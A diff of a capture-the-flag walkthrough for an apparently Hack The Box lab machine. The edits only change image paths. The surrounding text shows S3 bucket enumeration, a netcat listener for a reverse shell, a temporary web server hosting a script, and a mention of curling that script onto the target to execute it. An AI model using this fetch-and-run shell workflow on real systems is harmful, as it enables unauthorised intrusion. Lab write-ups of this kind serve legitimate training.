@@ -119,11 +119,11 @@ Answer: aws s3 ls
 
 Looking at the buckets with: `aws --endpoint=http://s3.thetoppers.htb s3 ls`
 
-<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 we can go into this further: `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
 
-<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 With this basic info we can see this would use PHP
 
@@ -162,7 +162,7 @@ Going to open a netcat shell with `nc -nvlp 1337`&#x20;
 
 Now open a temp webserver to pull our script from: `python3 -m http.server 8081`&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 Now we can use curl to get our script onto the server and executing it:
 
